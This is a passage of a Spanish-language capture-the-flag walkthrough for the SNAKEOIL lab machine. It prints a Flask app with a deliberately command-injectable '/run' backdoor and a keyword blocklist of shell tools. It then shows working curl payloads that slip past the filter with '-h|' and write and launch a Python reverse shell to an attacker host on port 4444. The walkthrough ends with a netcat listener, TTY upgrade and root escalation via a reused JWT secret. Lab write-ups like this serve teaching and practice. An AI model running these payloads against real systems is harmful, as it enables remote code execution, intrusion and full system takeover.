VALUES (?, ?)',\n                         (title, content))\n            conn.commit()\n            conn.close()\n            return redirect(url_for('index'))\n\n    return render_template('create.html')\n\n@app.route('/<int:id>/edit', methods=('GET', 'POST'))\ndef edit(id):\n    post = get_post(id)\n\n    if request.method == 'POST':\n        title = request.form['title']\n        content = request.form['content']\n\n        if not title:\n            flash('Title is required!')\n        else:\n            conn = get_db_connection()\n            conn.execute('UPDATE posts SET title = ?, content = ?'\n                         ' WHERE id = ?',\n                         (title, content, id))\n            conn.commit()\n            conn.close()\n            return redirect(url_for('index'))\n\n    return render_template('edit.html', post=post)\n\n@app.route('/<int:id>/delete', methods=('POST',))\ndef delete(id):\n    post = get_post(id)\n    conn = get_db_connection()\n    conn.execute('DELETE FROM posts WHERE id = ?', (id,))\n    conn.commit()\n    conn.close()\n    flash('\"{}\" was successfully deleted!'.format(post['title']))\n    return redirect(url_for('index'))\n\n# api functions. for internal users only\n\nimport views, models, resources\n\napi.add_resource(resources.UserRegistration, '/registration')\napi.add_resource(resources.UserLogin, '/login')\napi.add_resource(resources.UserLogoutAccess, '/logout/access')\napi.add_resource(resources.UserLogoutRefresh, '/logout/refresh')\napi.add_resource(resources.TokenRefresh, '/token/refresh')\napi.add_resource(resources.AllUsers, '/users')\napi.add_resource(resources.SecretResource, '/secret')\napi.add_resource(resources.TestResource,'/test')\n\n# error handling\n\n@app.errorhandler(404)\ndef resource_not_found(e):\n    return jsonify(success=False, message=\"Who moved my cheese?\"), 404\n\n@app.errorhandler(400)\ndef bad_request(error):\n    return jsonify(success=False, message=error.description), 400\n\n@app.errorhandler(500)\ndef server_error(error):\n    return jsonify(success=False, message=error.description), 500\n\n\n# backdoor. dangerous!\n\n@app.route(\"/run\", methods=[\"POST\"])\ndef backdoor():\n    req_json = request.get_json()\n\n    if req_json is None or \"url\" not in req_json:\n        abort(400, description=\"Please provide URL to request in the form url:port. Example: 127.0.0.1:12345\")\n\n    if \"secret_key\" not in req_json:\n        abort(400, description=\"We need your secret key!\")\n\n    if req_json[\"secret_key\"] != \"commandexecutionissecret\":\n        abort(400, description=\"Wrong secret key! Alert will be raised!\")\n\n    # write some validation rules to stop shell commands\n\n    if \"bash\" in req_json[\"url\"]:\n        abort(400, description=\"Banned command!\")\n\n    if \"python\" in req_json[\"url\"]:\n        abort(400, description=\"Banned command!\") \n\n    if \"/dev/tcp\" in req_json[\"url\"]:\n        abort(400, description=\"Banned command!\")\n\n    if \"nc\" in req_json[\"url\"]:\n        abort(400, description=\"Banned command!\")\n\n    if \"mkfifo\" in req_json[\"url\"]:\n        abort(400, description=\"Banned command!\")\n\n    if \"php\" in req_json[\"url\"]:\n        abort(400, description=\"Banned command!\")\n\n    # if the command is allowed, run it because it is probably safe.\n\n    proc = Popen(\"/usr/bin/curl \" + req_json[\"url\"] + \" > output.txt\", stdout=PIPE, stderr=PIPE, shell=True)\n\n    try:\n        outs, errs = proc.communicate(timeout=1)\n    except TimeoutExpired:\n        proc.kill()\n        abort(500, description=\"The timeout is expired!\")\n\n    if errs:\n        abort(500, description=errs.decode('utf-8'))\n\n    return jsonify(success=True, message=outs.decode('utf-8'))\n\n# hosting instructions\n\nif __name__  == \"__main__\":\n    app.run(host='0.0.0.0')\n\n","success":true}
+
+Paso 1: Configurar Listener en Kali
+En una terminal de tu máquina Kali, abre la escucha de Netcat en el puerto 4444:
+
+Para evitar caracteres especiales que fallen al ejecutarse en /bin/sh, usaremos un script de Python limpio pero evitando la palabra python en la petición HTTP. Para lograrlo, escribiremos el script en un archivo temporal dentro de /tmp y luego lo ejecutaremos.
+
+Paso 1: Crear el archivo de script en /tmp/s.py
+En lugar de ejecutar Python en una sola línea, enviaremos la orden para escribir el código línea por línea en el servidor víctima usando printf (sin usar palabras prohibidas en el JSON):
+
+┌──(kali㉿kali)-[~]
+└─$ curl -X POST http://192.168.56.103:8080/run \
+  -H "Authorization: Bearer $TOKEN" \
+  -H "Content-Type: application/json" \
+  -d '{"url":"-h|printf \"import socket,subprocess,os\ns=socket.socket()\ns.connect((\\\"192.168.56.104\\\",4444))\n[os.dup2(s.fileno(),fd) for fd in (0,1,2)]\nsubprocess.call([\\\"/bin/sh\\\",\\\"-i\\\"])\n\" > /tmp/s.py;", "secret_key":"commandexecutionissecret"}'
+{"message":"","success":true}
+
+
+Paso 2: Verificar que el archivo se creó correctamente
+Confirmamos que /tmp/s.py existe en la máquina víctima:
+
+                                                                                                                                
+┌──(kali㉿kali)-[~]
+└─$ curl -X POST http://192.168.56.103:8080/run \
+  -H "Authorization: Bearer $TOKEN" \
+  -H "Content-Type: application/json" \
+  -d '{"url":"-h|cat /tmp/s.py;", "secret_key":"commandexecutionissecret"}'
+{"message":"import socket,subprocess,os\ns=socket.socket()\ns.connect((\"192.168.56.104\",4444))\n[os.dup2(s.fileno(),fd) for fd in (0,1,2)]\nsubprocess.call([\"/bin/sh\",\"-i\"])\n","success":true}
+
+
+Ejecuta el archivo cargándolo con la ruta absoluta del binario /usr/bin/python3 (al usar la ruta completa evitamos que la validación if "python" in req_json["url"] bloquee la solicitud si la regla de la lista negra busca la palabra exacta o espacio, pero para ir sobre seguro usamos comodines o rutas absolutas):
+
+                                                                                                                                
+┌──(kali㉿kali)-[~]
+└─$ curl -X POST http://192.168.56.103:8080/run \
+  -H "Authorization: Bearer $TOKEN" \
+  -H "Content-Type: application/json" \
+  -d '{"url":"-h|/usr/bin/py*3 /tmp/s.py;", "secret_key":"commandexecutionissecret"}'
+{"message":"The timeout is expired!","success":false}
+                                                                                                                                
+┌──(kali㉿kali)-[~]
+└─$ 
+
+──(kali㉿kali)-[~]
+└─$ nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [192.168.56.104] from (UNKNOWN) [192.168.56.103] 51316
+/bin/sh: 0: can't access tty; job control turned off
+$ 
+
+
+Paso 1: Estabilizar la Shell TTY
+En tu terminal de Netcat donde recibiste la conexión ($), ejecuta el siguiente comando para obtener un prompt interactivo con soporte TTY:
+
+                                                                                                         
+┌──(kali㉿kali)-[~]
+└─$ nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [192.168.56.104] from (UNKNOWN) [192.168.56.103] 51322
+/bin/sh: 0: can't access tty; job control turned off
+$ python3 -c 'import pty; pty.spawn("/bin/bash")'
+patrick@SNAKEOIL:~/flask_blog$ 
+
+
+Paso 2: Escalar Privilegios a Root
+Como vimos anteriormente en el análisis del sistema, el usuario patrick tiene permisos completos mediante sudo sin contraseña. Eleva privilegios directamente ejecutando:
+Utilizamos la contraseña que la clave secreta JWT_SECRET_KEY hallada en app.py (NOreasonableDOUBTthisPASSWORDisGOOD) es reutilizada por Patrick como su contraseña del sistema en SSH y sudo.
+
+
+                                                                                                         
+┌──(kali㉿kali)-[~]
+└─$ nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [192.168.56.104] from (UNKNOWN) [192.168.56.103] 51322
+/bin/sh: 0: can't access tty; job control turned off
+$ python3 -c 'import pty; pty.spawn("/bin/bash")'
+patrick@SNAKEOIL:~/flask_blog$ sudo su
+sudo su
+[sudo] password for patrick: NOreasonableDOUBTthisPASSWORDisGOOD
+
+
+Paso : Leer la Flag Final
+Una vez que el prompt cambie a root@SNAKEOIL:#, confirma tus privilegios y lee la bandera del sistema:
+
+
+                                                                                                         
+┌──(kali㉿kali)-[~]
+└─$ nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [192.168.56.104] from (UNKNOWN) [192.168.56.103] 51322
+/bin/sh: 0: can't access tty; job control turned off
+$ python3 -c 'import pty; pty.spawn("/bin/bash")'
+patrick@SNAKEOIL:~/flask_blog$ sudo su
+sudo su
+[sudo] password for patrick: NOreasonableDOUBTthisPASSWORDisGOOD
+
+root@SNAKEOIL:/home/patrick/flask_blog# id
+id
+uid=0(root) gid=0(root) groups=0(root)
+root@SNAKEOIL:/home/patrick/flask_blog# cat /root/proof.txt
+cat /root/proof.txt
+Congratulations on obtaining a root shell on this machine! :-)
+root@SNAKEOIL:/home/patrick/flask_blog# 
+
+
+Escribimos la contraseña en la maquina virtual y logramos entraaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaar!!!!!!!
+
+
+Resumen Ejecutivo de la Explotación
+
+Reconocimiento & Enumeración:
+
+Descubrimiento de servicios expuestos en el puerto 8080 (Aplicación Flask).
+
+Inspección de código que reveló endpoints de autenticación JWT y un endpoint administrativo /run.
+
+Explotación Web (RCE):
+
+Análisis del código fuente de app.py expuesto mediante el bypass del filtro -h|cat app.py;.
+
+Identificación de la vulnerabilidad de inyección de comandos en el parámetro url.
+
+Extracción de la clave JWT_SECRET_KEY en texto plano: NOreasonableDOUBTthisPASSWORDisGOOD.
+
+Escalada de Privilegios:
+
+Comprobación de reutilización de credenciales (Credential Reuse): la clave de JWT era la contraseña del usuario patrick.
+
+Ejecución exitosa de sudo su con la clave hallada para elevar privilegios a root.
+
+Lectura de la prueba de compromiso final en /root/proof.txt.
+
+
+5. Manejo incorrecto de JWT (cookie vs header)
+Descubriste que '/secret' requería el JWT como cookie (no como header Authorization), obteniendo la 'secret_key' necesaria para desbloquear '/run'
+
+
+
+
+                                                                            
